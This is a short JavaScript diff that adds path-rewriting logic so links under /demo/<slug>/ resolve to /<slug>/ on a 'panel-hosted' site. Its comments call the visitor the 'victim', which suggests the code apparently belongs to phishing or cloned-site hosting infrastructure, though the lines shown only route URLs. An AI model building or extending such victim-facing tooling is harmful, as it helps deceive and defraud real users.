@@ -180,7 +180,25 @@
       return url;
     }
 
-    // PRODUCTION: strip /demo/<slug>/ when victim is NOT on /demo/ (hosted at root).
+    // PRODUCTION: victim is on /<slug>/<page> (panel-hosted, no own domain).
+    // Keep the slug prefix — rewrite /demo/<slug>/<page> → /<slug>/<page>.
+    var slugMatch = currentPath.match(/^\/([^\/]+)\//);
+    if (slugMatch && !currentPath.startsWith('/demo/')) {
+      var slug = slugMatch[1];
+      var esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      // If URL already has the correct /<slug>/ prefix, return as-is
+      if (new RegExp('^\\/' + esc + '\\/', 'i').test(url)) return url;
+      // Strip /demo/<slug>/ or /<slug>/ then rebuild as /<slug>/
+      if (!/^https?:\/\//i.test(url) && url.charAt(0) === '/') {
+        var pagePart = url
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
+        return '/' + slug + '/' + pagePart;
+      }
+      return url;
+    }
+    // PRODUCTION: victim is on own domain (root path, no slug prefix) — strip slug.
     if (!currentPath.startsWith('/demo/')) {
       url = url.replace(/^\/demo\/[^\/]+\//i, '/').replace(/^\/demo\//i, '/');
     }
